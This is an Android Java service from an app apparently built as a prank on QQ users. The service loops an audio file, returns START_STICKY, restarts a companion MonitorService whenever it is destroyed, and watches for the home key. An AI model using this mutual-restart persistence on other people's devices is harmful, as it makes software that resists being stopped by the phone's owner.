package com.johnson.qqmessageprank;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaPlayer;
import android.os.IBinder;
import android.util.Log;

import com.johnson.qqmessageprank.Utils.Const;

public class PlayerService extends Service {

    //play music
    private MediaPlayer mediaPlayer;


    public PlayerService() {
    }


    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i("TAG","PLAYSEVICE START");
        if (mediaPlayer!=null) {//如果monitor服务被先干了
            mediaPlayer.release();
            mediaPlayer=null;
        }
        mediaPlayer = MediaPlayer.create(getApplicationContext(), R.raw.wenson);
        mediaPlayer.setLooping(true);
        registerHomeKeyReceiver();

        mediaPlayer.start();

        return START_STICKY;
    }


    @Override
    public void onDestroy() {

        mediaPlayer.stop();
        mediaPlayer.release();
        monitor();
        Log.i("TAG", " player KILLED BY OS");
        super.onDestroy();
    }

    private void monitor(){

        Log.i("TAG", " PLAYER UP  WAKE MONITOR");
        Intent monitor = new Intent(this,MonitorService.class);
        monitor.setAction(Const.MONITOR_SERVICE_ACTION);
        startService(monitor);
    }


    private HomeWatcherReceiver mHomeKeyReceiver = null;

    private void registerHomeKeyReceiver() {

        mHomeKeyReceiver = new HomeWatcherReceiver();
        IntentFilter homeFilter = new IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

        registerReceiver(mHomeKeyReceiver, homeFilter);
    }
}
